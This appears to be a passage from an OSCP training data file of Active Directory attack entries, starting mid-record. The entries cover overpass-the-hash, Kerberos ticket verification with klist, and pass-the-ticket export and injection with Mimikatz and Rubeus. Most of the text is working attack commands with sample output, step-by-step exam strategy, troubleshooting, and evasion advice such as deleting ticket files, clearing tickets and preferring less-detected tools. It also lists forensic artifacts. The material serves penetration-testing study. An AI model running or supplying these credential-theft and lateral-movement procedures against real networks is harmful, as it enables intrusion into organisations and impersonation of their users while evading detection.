WHEN TO USE PASS-THE-HASH INSTEAD:
- Target accepts NTLM authentication
- Faster/simpler (no Kerberos setup)
- Impacket tools from Kali (PSExec, WMIExec, SMBExec)

COMMON FAILURES:
- No TGT generated:
Forgot to trigger Kerberos (net use)
- IP used instead of hostname:
Kerberos requires hostname for SPN
- Wrong domain format:
Use FQDN (corp.com not CORP)
- Time skew >5 minutes:
Synchronize clock with DC
- Hash invalid:
Verify extraction from sekurlsa::logonpasswords

FORENSIC ARTIFACTS:
- Event ID 4624:
Logon Type 9 (NewCredentials) when using /run
- Event ID 4768:
Kerberos TGT request (pre-authentication)
- Event ID 4769:
Kerberos TGS request (service ticket)
- Event ID 4648:
Explicit credential logon
- Mimikatz execution traces in memory/logs
- PowerShell spawned by mimikatz.exe (process tree)

KERBEROS TICKET LIFETIME:
Default:
- TGT:
10 hours
- TGS:
10 hours
- Renewable for 7 days

Check End Time in klist output.","high","","","","{""privilege::debug FAILED"": ""Run mimikatz as Administrator"", ""No tickets generated"": ""Must trigger Kerberos auth - use 'net use' or access network resource"", ""whoami shows wrong user"": ""Expected - token shows original user, but Kerberos tickets use <USER>""}","{""sekurlsa::pth"": ""Pass-the-hash module"", ""/user"": ""Username"", ""/domain"": ""Domain FQDN (corp.com not corp)"", ""/ntlm"": ""NTLM hash"", ""/run"": ""Program to launch (PowerShell recommended)""}","","[""overpass-rubeus-asktgt""]",""
"overpass-net-use-trigger","Overpass-the-Hash - Trigger Kerberos TGT Request","active-directory","net use \\<TARGET>","Trigger Kerberos TGT/TGS generation after overpass-the-hash by accessing network resource","lateral-movement","net use \\files04","OSCP TRAINING MATERIAL - TRIGGERING KERBEROS TGT AFTER OVERPASS-THE-HASH:
TRAINING EXAMPLE (FROM OSCP MODULE):
After performing sekurlsa::pth, training demonstrates triggering Kerberos:
```powershell
PS C:\Tools> net use \\files04
The command completed successfully.
```

Then verify tickets:
```powershell
PS C:\Tools> klist
```

Output shows:
```
Current LogonId is 0:0x11e387b

Cached Tickets:
(2)

#0>     Client:
jen @ CORP.COM
        Server:
krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type:
AES-256-CTS-HMAC-SHA1-96

#1>     Client:
jen @ CORP.COM
        Server:
cifs/files04 @ CORP.COM
        KerbTicket Encryption Type:
AES-256-CTS-HMAC-SHA1-96
```

Confirms TGT (#0, Server:
krbtgt) and TGS (#1, Server:
cifs/files04) created.

WHY TRIGGER IS NECESSARY:
Overpass-the-hash is TWO-STEP process:
Step 1:
sekurlsa::pth injects credentials into LSASS
Step 2:
Trigger Kerberos authentication to REQUEST TGT from KDC

sekurlsa::pth does NOT automatically create TGT.

It only sets up credential context.

You must explicitly trigger Kerberos authentication.

WHAT ""TRIGGER"" MEANS:
Any operation that requires network authentication to domain resource:
- net use \\hostname
- dir \\hostname\share
- Get-Content \\hostname\path\file.txt
- Test-Path \\hostname\share
- PsExec.exe \\hostname cmd (auto-triggers)

These operations cause Windows to:
1.

Detect need for authentication to domain resource
2.

Check ticket cache (empty after sekurlsa::pth)
3.

Request TGT from KDC using injected credentials
4.

Request TGS for specific service
5.

Cache both tickets for reuse

HOSTNAME REQUIREMENT (CRITICAL):
Kerberos requires HOSTNAME, not IP address.

Correct:
```powershell
net use \\files04
```

Incorrect:
```powershell
net use \\192.168.50.73
```

Why?
Kerberos uses Service Principal Names (SPNs) format:
- service/hostname@DOMAIN
- Example:
cifs/files04@CORP.COM

SPN cannot be constructed from IP address.

DNS resolution maps hostname  IP, but SPN needs hostname.

SERVICE PRINCIPAL NAMES (SPNs):
Different services have different SPNs:
- CIFS/SMB:
cifs/hostname (file shares)
- HTTP:
http/hostname (web services)
- LDAP:
ldap/hostname (directory services)
- HOST:
host/hostname (general services)
- MSSQL:
MSSQLSvc/hostname:port (SQL Server)

Trigger for CIFS:
net use \\hostname
Trigger for HTTP:
Invoke-WebRequest http://hostname
Trigger for LDAP:
Get-ADUser (domain queries)

TICKET CREATION FLOW:
1.

net use \\files04 executed
2.

Windows detects domain resource access needed
3.

Checks Kerberos ticket cache for existing cifs/files04 ticket
4.

No ticket found, checks for TGT
5.

No TGT found, requests TGT from KDC:
   a.

AS-REQ (Authentication Service Request) to KDC
   b.

Pre-authentication:
Timestamp encrypted with jen's hash (injected by Mimikatz)
   c.

KDC validates pre-auth with jen's stored hash
   d.

AS-REP (Authentication Service Reply):
TGT issued
6.

TGT cached (#0 in klist output)
7.

Using TGT, requests TGS for cifs/files04:
   a.

TGS-REQ (Ticket Granting Service Request) to KDC
   b.

Presents TGT as proof of identity
   c.

KDC issues service ticket for cifs/files04
   d.

TGS-REP:
Service ticket returned
8.

TGS cached (#1 in klist output)
9.

Service ticket presented to files04 for access
10.

Connection succeeds

TWO TICKETS CREATED:
Ticket #0 - TGT (Ticket Granting Ticket):
- Server:
krbtgt/CORP.COM
- Purpose:
Request service tickets
- Lifetime:
10 hours (default)
- Renewable:
7 days (default)
- Encryption:
AES-256 or RC4

Ticket #1 - TGS (Ticket Granting Service):
- Server:
cifs/files04
- Purpose:
Access specific service on specific host
- Lifetime:
10 hours (default)
- Service-specific:
Only works for CIFS on files04

ALTERNATIVE TRIGGER COMMANDS:
From new PowerShell (spawned by sekurlsa::pth):
File access:
```powershell
dir \\files04\c$
```

Test connection:
```powershell
Test-Path \\files04\c$
```

Explicit authentication:
```powershell
.\PsExec.exe \\files04 cmd
```

Any will trigger TGT request.

VERIFICATION:
Always verify with klist after trigger:
```powershell
klist
```

Success indicators:
- Cached Tickets:
(2) or more
- Client:
jen @ CORP.COM (impersonated user)
- Server:
krbtgt/CORP.COM (TGT exists)
- Server:
cifs/files04 (service ticket exists)

Failure indicators:
- Cached Tickets:
(0)
- No tickets displayed
- Client still shows original user

If no tickets:
1.

Verify sekurlsa::pth completed successfully
2.

Verify running commands in Mimikatz-spawned PowerShell (not original)
3.

Check hostname used (not IP)
4.

Verify network connectivity to DC (port 88)
5.

Check time synchronization (must be <5 min difference with DC)

NETWORK PATH FORMATS:
UNC paths for triggering:
- \\hostname (default share discovery)
- \\hostname\share (specific share)
- \\hostname\share\path\file (specific file)
- \\hostname.domain.com (FQDN works too)
- \\hostname (short name sufficient if DNS resolves)

NOT triggering Kerberos:
- \\192.168.50.73 (IP address - falls back to NTLM)
- C:\local\path (local file system)
- Localhost or 127.0.0.1 (local machine)

PORT REQUIREMENTS:
- TCP/UDP 88:
Kerberos (KDC communication)
- TCP/UDP 53:
DNS (hostname resolution)
- TCP 445:
SMB (if using net use for files)

KDC COMMUNICATION:
KDC = Key Distribution Center (runs on Domain Controller):
- Handles TGT requests (AS)
- Handles TGS requests (TGS)
- Validates pre-authentication
- Issues tickets

From training, KDC is domain controller (DC1 typically).

TIME ESTIMATE:
- net use \\hostname:
2-5 seconds
- TGT/TGS request:
<3 seconds
- klist verification:
<5 seconds
- Total:
<10 seconds

EXAM STRATEGY:
1.

After sekurlsa::pth, IMMEDIATELY trigger Kerberos
2.

Use simple trigger:
net use \\<DC_HOSTNAME>
3.

Verify with klist before proceeding
4.

If no tickets, troubleshoot before continuing
5.

Common issue:
Using IP instead of hostname

COMMON ERRORS:
System error 5 - Access denied:
- Hash invalid or user lacks permissions
- Verify hash correctness
- Check user account status (disabled?)

The network path was not found:
- Hostname not resolvable via DNS
- Check DNS resolution:
nslookup hostname
- Verify hostname spelling
- Try FQDN:
\\files04.corp.com

No tickets after successful net use:
- Not running in Mimikatz-spawned PowerShell
- Close and use the NEW PowerShell window
- Credentials only injected in spawned process

IP address used:
- Change to hostname immediately
- Kerberos will NOT work with IP
- NTLM fallback may occur (defeats purpose)

FORENSIC ARTIFACTS:
- Event ID 4768:
Kerberos TGT request (on DC)
- Event ID 4769:
Kerberos TGS request (on DC)
- Event ID 4624:
Network logon Type 3 (on target)
- Network traffic on port 88 (to DC)
- SMB traffic on port 445 (to target)

KERBEROS VS NTLM FALLBACK:
If hostname not used:
- Windows attempts Kerberos first
- SPN lookup fails (no hostname)
- Falls back to NTLM authentication
- Defeats purpose of overpass (wanted Kerberos)

Always use hostname to ensure Kerberos used.","high","","","","{""Access denied"": ""Hash may be invalid or user lacks permissions"", ""Network path not found"": ""Use hostname not IP - Kerberos requires SPN resolution"", ""Still no tickets"": ""Verify PowerShell session spawned by mimikatz sekurlsa::pth"", ""IP address used"": ""Change to hostname: net use \\\\FILES04 not \\\\192.168.50.73""}","{""net use"": ""Map network drive (triggers Kerberos authentication)"", ""\\\\<TARGET>"": ""UNC path - MUST use hostname not IP for Kerberos SPN lookup""}","[""overpass-mimikatz-pth""]","",""
"kerberos-klist-verify","Kerberos - List Cached Tickets (klist)","active-directory","klist","Display cached Kerberos TGT and TGS tickets for current session","lateral-movement","","OSCP TRAINING MATERIAL - VERIFY KERBEROS TICKETS WITH KLIST:
TRAINING EXAMPLE (FROM OSCP MODULE):
After overpass-the-hash and triggering Kerberos:
```powershell
PS C:\Tools> klist

Current LogonId is 0:0x11e387b

Cached Tickets:
(2)

#0>     Client:
jen @ CORP.COM
        Server:
krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type:
AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time:
5/16/2022 18:30:12
        End Time:
  5/17/2022 4:30:12
        Renew Time:
5/23/2022 18:30:12

#1>     Client:
jen @ CORP.COM
        Server:
cifs/files04 @ CORP.COM
        KerbTicket Encryption Type:
AES-256-CTS-HMAC-SHA1-96
```

WHAT IS KLIST:
Built-in Windows command (part of Windows OS since Windows 2000) that displays cached Kerberos tickets for current logon session.

No installation required, always available.

TICKET TYPES:
Ticket #0 - TGT (Ticket Granting Ticket):
- Server:
krbtgt/DOMAIN (krbtgt is special Kerberos service account)
- Purpose:
Request service tickets from KDC
- Lifetime:
10 hours default (configurable via GPO)
- Renewable:
7 days default
- Most important ticket - can request any service ticket

Ticket #1+ - TGS (Ticket Granting Service / Service Tickets):
- Server:
service/hostname @ DOMAIN
- Purpose:
Access specific service on specific server
- Examples:
cifs/files04 (file access), http/web01 (web), ldap/dc1 (directory)
- Service-specific:
Cannot reuse for different service/host

WHY VERIFY TICKETS:
- Confirm overpass-the-hash succeeded
- Check ticket exists before lateral movement (avoid wasted attempts)
- Verify ticket not expired
- Identify which services accessible
- Troubleshoot authentication issues

KEY FIELDS EXPLAINED:
Client:
- Shows WHO the ticket is for
- jen @ CORP.COM = Ticket grants jen's access
- Should match user from overpass/pass-the-ticket

Server:
- Shows WHAT SERVICE the ticket grants access to
- krbtgt = TGT (can request other tickets)
- cifs/hostname = File share access
- http/hostname = Web service access

KerbTicket Encryption Type:
- AES-256-CTS-HMAC-SHA1-96:
Modern, secure (preferred)
- AES-128-CTS-HMAC-SHA1-96:
Modern, acceptable
- RC4-HMAC (0x17):
Legacy, weak (essentially NTLM hash)
- DES:
Very old, deprecated

Ticket Flags:
- forwardable:
Ticket can be forwarded to other services
- renewable:
Ticket can be renewed before expiration
- initial:
First authentication (TGT from password/hash)
- pre_authent:
Pre-authentication performed

Start Time:
- When ticket becomes valid
- Usually immediate

End Time:
- When ticket expires
- Default:
Start Time + 10 hours
- After End Time:
Ticket invalid, must re-authenticate

Renew Time:
- Maximum lifetime if renewed
- Default:
Start Time + 7 days
- Can request renewal before End Time

LogonId:
- Unique identifier for logon session
- Format:
0:0xHEXVALUE
- Tickets tied to specific logon session
- Different sessions have different ticket caches

COMMON VERIFICATION SCENARIOS:
After overpass-the-hash:
```powershell
klist
```
Expect:
- Cached Tickets:
(2+)
- Client:
impersonated_user @ DOMAIN
- Server:
krbtgt/DOMAIN (TGT)
- Server:
cifs/target or service/target (TGS)

After pass-the-ticket:
```powershell
klist
```
Expect:
- New ticket appears in list
- Client shows stolen ticket's user
- Server shows service from imported ticket

TROUBLESHOOTING WITH KLIST:
Cached Tickets:
(0)
- No Kerberos authentication performed
- Overpass not triggered (missing net use step)
- Wrong PowerShell session (not Mimikatz-spawned)
- Tickets purged

Client shows wrong user:
- Tickets from different session
- Overpass failed
- Pass-the-ticket not injected correctly

Server doesn't match target:
- Wrong service ticket
- Need different ticket for target service
- May need to trigger additional authentication

Ticket expired (current time > End Time):
- Re-authenticate to get new ticket
- Or renew if within Renew Time

ADVANCED KLIST COMMANDS:
klist tgt:
- Show only TGT tickets
- Filters out service tickets

klist purge:
- Delete ALL cached tickets
- Requires admin or affects only current user
- Used for cleanup/OPSEC

klist sessions:
- Show all logon sessions
- Displays LogonId for each

klist -lh 0 -li 0x3e7:
- Query specific logon session
- Useful for viewing other users' tickets (requires SYSTEM)

WHAT KLIST DOESN'T SHOW:
- Password or hash
- Ticket encryption keys
- Full ticket contents (use Mimikatz for export)
- Tickets from other logon sessions (unless admin)

TIME ESTIMATE:
- Execution:
<5 seconds
- Output review:
10-20 seconds

EXAM STRATEGY:
1.

Run klist AFTER every Kerberos operation
2.

Verify tickets before lateral movement attempts
3.

Check End Time - don't use expired tickets
4.

If no tickets, troubleshoot before proceeding
5.

Screenshot klist output for documentation

COMMON MISTAKES:
- Forgetting to verify after overpass-the-hash
- Using expired tickets (check End Time!)
- Checking klist in wrong PowerShell window
- Expecting whoami to show ticket user (use klist Client field instead)","high","","","","{""No tickets found"": ""No Kerberos auth performed yet - trigger with net use or access network resource"", ""Wrong user in tickets"": ""Tickets cached in different session - ensure checking correct PowerShell window"", ""Tickets expired"": ""End Time shows past time - perform new authentication""}","{""klist"": ""List Kerberos tickets (built-in Windows command)"", ""klist purge"": ""Clear all cached tickets"", ""klist tgt"": ""Show only TGT tickets""}","","",""
"passticket-mimikatz-export","Pass-the-Ticket - Export Tickets (Mimikatz)","active-directory","mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export","Export all cached Kerberos tickets to .kirbi files for reuse on other systems","lateral-movement","","OSCP TRAINING MATERIAL - PASS-THE-TICKET EXPORT WITH MIMIKATZ:
TRAINING EXAMPLE (FROM OSCP MODULE):
Scenario:
dave has access to \\web04\backup, jen does not.

Goal:
Steal dave's ticket and use it as jen.

From CLIENT74 as jen (with admin rights), export all tickets:
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export

[...]
* Saved to file [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
* Saved to file [0;3e7]-2-0-40e10000-dave@krbtgt-CORP.COM.kirbi
[...]
```

Training shows multiple .kirbi files created, including dave's TGS for CIFS service on web04.

WHAT IS PASS-THE-TICKET:
Lateral movement technique that steals and reuses existing Kerberos tickets from one session/machine and injects them into another, enabling access without knowing passwords or hashes.

KEY DISTINCTION FROM OTHER TECHNIQUES:
- Pass-the-Hash:
Uses NTLM hash for authentication
- Overpass-the-Hash:
Converts NTLM hash to TGT
- Pass-the-Ticket:
Steals and reuses existing Kerberos tickets

Pass-the-Ticket advantage:
No hash needed, just steal live tickets.

TRAINING SCENARIO CONTEXT:
- dave:
Domain user with access to \\web04\backup
- jen:
Domain user, local admin on CLIENT74, NO access to \\web04\backup
- CLIENT74:
Windows client where both dave and jen have sessions
- Goal:
jen steals dave's ticket to access \\web04\backup

HOW TICKET EXPORT WORKS:
1.

Mimikatz accesses LSASS process (requires privilege::debug)
2.

Reads Kerberos ticket cache from memory
3.

Extracts tickets from all active logon sessions
4.

Saves each ticket as .kirbi file (Mimikatz format)
5.

Tickets written to current directory

WHY TICKETS ARE VALUABLE:
- Tickets grant access without passwords
- Can be moved to different machines
- Can be injected into different user sessions
- Portable authentication credentials
- Time-limited but reusable until expiration

KIRBI FILENAME FORMAT (FROM TRAINING):
```
[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

Breakdown:
- [0;12bd0]:
LUID (Logon Session ID) - identifies source session
- 0:
Group number
- 0:
Type (0=TGS service ticket, 2=TGT)
- 40810000:
Flags (hex)
- dave:
Username
- cifs-web04:
Service (CIFS) and hostname (web04)
- .kirbi:
Mimikatz format

TICKET TYPES IN EXPORT:
TGT (Ticket Granting Ticket):
- Filename pattern:
[LUID]-2-0-FLAGS-user@krbtgt-DOMAIN.kirbi
- Example:
[0;3e7]-2-0-40e10000-dave@krbtgt-CORP.COM.kirbi
- Server:
krbtgt
- Purpose:
Request service tickets
- Most valuable - can request any service ticket

TGS (Service Tickets):
- Filename pattern:
[LUID]-0-0-FLAGS-user@service-host.kirbi
- Example:
[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
- Server:
specific service/host
- Purpose:
Access specific service on specific server
- Service-specific:
Only works for that service/host combination

From training, dave's CIFS ticket for web04 was the target:
```
[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

This ticket grants file share access (CIFS) to web04 as dave.

MULTIPLE SESSIONS EXPORTED:
Mimikatz exports tickets from ALL logon sessions on the system:
- Interactive logins (users at keyboard)
- RDP sessions
- Service accounts
- Network authentications
- RunAs sessions

Typical export yields:
- Dozens to hundreds of .kirbi files
- Tickets from multiple users
- Mix of TGT and TGS tickets
- Current and expired tickets

FINDING VALUABLE TICKETS:
From training, after export:
```powershell
PS C:\Tools> dir *.kirbi
```

Look for:
- High-privilege users (domain admins, server admins)
- TGT tickets (most flexible)
- Service tickets to target systems
- Tickets with future End Time (not expired)

FROM TRAINING:
Identified dave's ticket by:
1.

Looking for username (dave)
2.

Looking for target service/host (cifs-web04)
3.

Checking it's dave's ticket for web04 access

PRIVILEGE REQUIREMENTS:
Export requires:
- Administrator privileges on current system
- privilege::debug enabled (SeDebugPrivilege)
- Access to LSASS process

From training:
jen was local admin on CLIENT74, enabling ticket export.

NO ADMIN REQUIRED ON TARGET:
Important:
Admin needed on SOURCE (export machine), NOT target.
- Export:
Admin on CLIENT74 (current machine)
- Inject:
No admin needed (current user session)
- Use:
Depends on ticket permissions

KIRBI FILE PORTABILITY:
Once exported:
- .kirbi files are portable
- Can be copied to USB/network
- Can be moved to different machines
- Can be injected into any Windows session
- Cross-machine lateral movement enabled

EXPORT OUTPUT EXAMPLES:
From training, Mimikatz shows:
```
 * Saved to file [0;3e7]-2-0-40e10000-dave@krbtgt-CORP.COM.kirbi
 * Saved to file [0;3e7]-2-1-40e10000-dave@ldap-DC1.CORP.COM.kirbi
 * Saved to file [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

Each line indicates successful ticket export.

LOGON SESSION IDS (LUID):
- [0;3e7]:
System session (LUID 0x3e7 = 999 decimal)
- [0;12bd0]:
User session (dave's interactive login)
- Different LUIDs = different logon sessions
- Same user can have multiple LUIDs (multiple sessions)

TIME LIMIT ON TICKETS:
Exported tickets retain original expiration:
- TGT:
Typically 10 hours from issue
- TGS:
Typically 10 hours from issue
- Check End Time after export
- Expired tickets = useless

Verify ticket validity:
```powershell
mimikatz # kerberos::list /export
```
Shows expiration before export.

MANUAL ALTERNATIVE:
No Windows-native tool exports tickets:
- Mimikatz required for export
- Rubeus alternative:
Rubeus.exe dump
- klist shows tickets but cannot export

Rubeus export:
```
Rubeus.exe dump /service:krbtgt /nowrap
```
Outputs base64, not .kirbi files.

SECURITY IMPLICATIONS:
- Ticket theft doesn't trigger password change notifications
- Legitimate ticket usage - hard to detect
- No failed authentication logs
- Stealthier than password attacks

TIME ESTIMATE:
- Export execution:
5-10 seconds
- File review/identification:
1-2 minutes
- Total:
2-3 minutes

EXAM STRATEGY:
1.

Gain admin on compromised system
2.

Export ALL tickets immediately (sekurlsa::tickets /export)
3.

Identify high-value tickets (domain admins, service accounts)
4.

Identify tickets to target systems
5.

Inject relevant tickets for lateral movement
6.

Store .kirbi files for later use

COMMON FAILURES:
privilege::debug FAILED:
- Not running mimikatz as Administrator
- Right-click mimikatz.exe  Run as administrator

No tickets exported:
- No active Kerberos sessions on system
- Wait for users to login
- Or trigger authentication (runas, net use, etc.)

ERROR kuhl_m_sekurlsa_acquireLSA:
- LSASS Protected Process Light (PPL) enabled
- Advanced protection - may need bypass
- Try different system

FORENSIC ARTIFACTS:
- Mimikatz execution traces
- LSASS process access (Event ID 10, Sysmon)
- .kirbi files on disk (unless deleted)
- File creation timestamps
- Process creation (Event ID 4688)

OPSEC CONSIDERATIONS:
- Delete .kirbi files after injection
- Use memory-only methods when possible
- Mimikatz leaves traces in memory scanners
- Consider Rubeus as less-detected alternative","high","","","","{""privilege::debug FAILED"": ""Run mimikatz as Administrator"", ""No tickets exported"": ""No active Kerberos sessions - wait for users to login/authenticate"", ""ERROR kuhl_m_sekurlsa_acquireLSA"": ""LSASS protection enabled - may need to bypass PPL"", ""Too many .kirbi files"": ""Normal - exports all tickets from all sessions""}","{""sekurlsa::tickets"": ""Access LSASS process to extract tickets"", ""/export"": ""Save tickets to .kirbi files in current directory"", ""privilege::debug"": ""Required for LSASS memory access""}","","",""
"passticket-mimikatz-inject","Pass-the-Ticket - Inject Ticket (Mimikatz)","active-directory","mimikatz # kerberos::ptt <TICKET_FILE>.kirbi","Inject exported .kirbi Kerberos ticket into current session for impersonation","lateral-movement","mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi.kirbi","OSCP TRAINING MATERIAL - PASS-THE-TICKET INJECT WITH MIMIKATZ:
TRAINING EXAMPLE (FROM OSCP MODULE):
Continuing from Pass-the-Ticket export scenario:
Scenario:
jen (lacking access) injects dave's ticket (has access) to reach \\web04\backup.

From CLIENT74 as jen, after exporting tickets:
```
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

* File:
'[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi':
OK
```

Success message confirms injection.

Verify injection:
```powershell
PS C:\Tools> klist

Cached Tickets:
(1)

#0>     Client:
dave @ CORP.COM
        Server:
cifs/web04 @ CORP.COM
        KerbTicket Encryption Type:
AES-256-CTS-HMAC-SHA1-96
```

Ticket now cached as jen, but grants dave's access.

Test access:
```powershell
PS C:\Tools> ls \\web04\backup

    Directory:
\\web04\backup

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/16/2022   1:11 PM          11541 backup.txt
```

Success! jen accessed \\web04\backup using dave's stolen ticket.

WHAT IS PASS-THE-TICKET INJECTION:
Taking exported Kerberos ticket (.kirbi file) and loading it into current Windows session's ticket cache, enabling authentication as the ticket owner without their password or hash.

CRITICAL UNDERSTANDING:
After injection:
- whoami:
Still shows jen (process identity)
- klist:
Shows dave's ticket (authentication identity)
- Network access:
Authenticates as dave (ticket owner)
- File operations to \\web04\backup:
Succeed as dave

Identity split:
- Local identity:
jen (process token)
- Network identity:
dave (Kerberos ticket)

TRAINING SCENARIO BREAKDOWN:
Before injection:
- jen attempts:
ls \\web04\backup
- Result:
Access denied (jen lacks permissions)

After injection:
- jen attempts:
ls \\web04\backup (same command)
- Result:
Success (dave's ticket used for authentication)

No password needed, no hash needed - just stolen ticket.

HOW TICKET INJECTION WORKS:
1.

Mimikatz kerberos::ptt reads .kirbi file
2.

Parses Kerberos ticket structure
3.

Injects ticket into current session's ticket cache (via LsaCallAuthenticationPackage API)
4.

Windows Kerberos provider accepts ticket as legitimate
5.

Subsequent authentication uses injected ticket

WHY THIS WORKS:
Windows doesn't validate HOW ticket was obtained:
- Legitimate:
User authenticated, KDC issued ticket
- Stolen:
Mimikatz injected ticket from file
- Windows treats both identically
- No verification of ticket source
- Ticket contains all necessary cryptographic proof

NO ADMIN REQUIRED (CRITICAL ADVANTAGE):
Unlike Pass-the-Hash:
- Pass-the-Hash:
Requires admin (LSASS access for injection)
- Pass-the-Ticket (inject):
NO admin required
- Can inject into current user session
- Can steal from OWN session and reuse

From training:
jen used her own tickets (as local admin) but could also use stolen tickets without admin if exporting from own session.

TICKET SERVICE MATCHING:
Ticket service MUST match target:
From training:
- Ticket:
dave@cifs-web04.kirbi
- Service:
CIFS (file shares)
- Host:
web04
- Works for:
\\web04\* file access
- Does NOT work for:
\\web04 HTTP, \\files04 CIFS, etc.

Service examples:
- cifs/hostname:
File share access (SMB/CIFS)
- http/hostname:
Web services
- ldap/hostname:
Directory services
- host/hostname:
Generic host services
- mssql/hostname:
SQL Server

TICKET TYPES FOR INJECTION:
TGS (Service Ticket) - Like training example:
- Specific service + host
- Immediate use
- Limited scope
- Example:
dave@cifs-web04.kirbi

TGT (Ticket Granting Ticket) - Most valuable:
- Can request ANY service ticket
- Flexible
- Example:
dave@krbtgt-CORP.COM.kirbi
- After injection, can access any service as dave

From training scenario, TGS was sufficient (only needed web04 access), but TGT would enable broader access.

MIMIKATZ INJECTION COMMAND:
```
mimikatz # kerberos::ptt <FILENAME>.kirbi
```

Alternative syntax:
```
mimikatz # kerberos::ptt /ticket:<FILENAME>.kirbi
```

Both work identically.

INJECTION VERIFICATION:
Always verify with klist:
```powershell
klist
```

Success indicators:
- Cached Tickets:
(N) where N increased
- New ticket appears in list
- Client:
Shows ticket owner (dave)
- Server:
Shows service (cifs/web04)

Failure indicators:
- No new tickets
- Error message from Mimikatz
- File not found

TESTING INJECTED TICKET:
From training:
```powershell
ls \\web04\backup
```

Attempt access to resource ticket should grant.

Success:
- Directory listing appears
- No ""Access denied"" error
- Operations complete normally

Failure:
- Access denied:
Ticket wrong service/expired/invalid
- Network path not found:
Hostname resolution issue
- Logon failure:
Ticket expired or invalid

TICKET LIFETIME AND EXPIRATION:
Injected tickets retain original expiration:
- Original End Time preserved
- No extension via injection
- Check klist for End Time
- Expired ticket = useless

From training:
Tickets typically 10-hour lifetime.

If ticket expired:
- Cannot use (KDC rejects)
- Must obtain fresh ticket
- Export tickets immediately after compromise

CROSS-SESSION INJECTION:
Tickets can be:
- Exported from dave's session
- Injected into jen's session
- Used on same machine
- Or moved to different machine

Portability:
- .kirbi file contains full ticket
- Platform-independent (Windows only)
- Machine-independent
- Network-transferable

MULTIPLE TICKET INJECTION:
Can inject multiple tickets:
```
mimikatz # kerberos::ptt ticket1.kirbi
mimikatz # kerberos::ptt ticket2.kirbi
mimikatz # kerberos::ptt ticket3.kirbi
```

Each adds to cache:
- klist shows all injected tickets
- Multiple users/services accessible
- No limit on concurrent tickets

FILE PATH HANDLING:
Relative path:
```
mimikatz # kerberos::ptt ticket.kirbi
```
Looks in current directory.

Absolute path:
```
mimikatz # kerberos::ptt C:\Temp\ticket.kirbi
```

Netw ork path:
```
mimikatz # kerberos::ptt \\attacker\share\ticket.kirbi
```

TROUBLESHOOTING:
File not found:
- Check current directory:
dir *.kirbi
- Use full path
- Verify filename spelling (case-sensitive in some contexts)

Ticket import failed:
- .kirbi file corrupted
- Re-export from source
- Try different ticket

Access still denied after injection:
- Ticket expired:
Check klist End Time
- Wrong service:
Verify ticket service matches target
- Wrong host:
Verify ticket hostname matches target
- Ticket invalid:
Re-export fresh ticket

MANUAL ALTERNATIVE:
Rubeus provides alternative:
```
Rubeus.exe ptt /ticket:ticket.kirbi
```

Same functionality, different tool.

Advantage:
- Rubeus less detected than Mimikatz
- More modern codebase
- Better OPSEC features

TIME ESTIMATE:
- Injection:
5-10 seconds
- Verification (klist):
5 seconds
- Test access:
10-30 seconds
- Total:
<1 minute

EXAM STRATEGY:
1.

Export tickets from compromised systems
2.

Identify valuable tickets (high-privilege users, target services)
3.

Inject relevant tickets into your session
4.

Verify with klist
5.

Test access immediately
6.

If success, proceed with exploitation
7.

If failure, try different ticket or troubleshoot

COMPARISON TO OTHER TECHNIQUES:
Pass-the-Hash:
- Requires:
NTLM hash
- Privilege:
Admin (for injection)
- Scope:
NTLM authentication
- Tools:
Mimikatz, Impacket

Overpass-the-Hash:
- Requires:
NTLM hash
- Privilege:
Admin (for Mimikatz)
- Scope:
Kerberos authentication
- Result:
Generates new TGT

Pass-the-Ticket:
- Requires:
Existing ticket
- Privilege:
None (for injection into own session)
- Scope:
Specific service or TGT
- Result:
Reuses stolen ticket

Pass-the-Ticket advantages:
- No password/hash needed
- No admin required (for injection)
- Stealthier (reuses legitimate ticket)
- Works across machines

FORENSIC ARTIFACTS:
- Mimikatz execution (if used)
- .kirbi file on disk (unless deleted)
- Kerberos authentication events (Event ID 4769 on target)
- No new TGT request (reuses existing)
- Ticket appears in klist output

OPSEC CONSIDERATIONS:
- Delete .kirbi files after injection
- Use Rubeus instead of Mimikatz (less detected)
- Inject tickets only when needed
- Clear tickets after use (klist purge)
- Stolen ticket usage looks legitimate (hard to detect)","high","","","","{""File not found"": ""Use full path or ensure in current directory: dir *.kirbi"", ""Ticket import failed"": "".kirbi file may be corrupted - re-export"", ""Access still denied after import"": ""Ticket may be expired - check with klist"", ""Wrong service"": ""Ensure ticket matches target service (cifs for file shares, http for web, etc.)""}","{""kerberos::ptt"": ""Pass-the-ticket module"", ""<FILE>.kirbi"": ""Ticket file to inject (full path or relative)""}","","[""passticket-rubeus-ptt"", ""rubeus-ptt""]",""
"passticket-rubeus-ptt","Pass-the-Ticket - Rubeus PTT","active-directory","Rubeus.exe ptt /ticket:<TICKET_FILE>.kirbi","Inject .kirbi ticket using Rubeus (alternative to Mimikatz)","lateral-movement","Rubeus.exe ptt /ticket:ticket.kirbi.kirbi","EDUCATIONAL CONTEXT:
Rubeus provides modern alternative to Mimikatz for pass-the-ticket.

WHY RUBEUS:
More actively maintained, better OPSEC features.

TIME ESTIMATE:
<1 minute.

EXAM TIP:
Rubeus and Mimikatz both work - use whichever available.","high","","","","{""File not found"": ""Use full path"", ""Import failed"": ""Ensure .kirbi format correct""}","{""ptt"": ""Pass-the-ticket action"", ""/ticket"": ""Path to .kirbi file""}","","[""passticket-mimikatz-inject""]",""
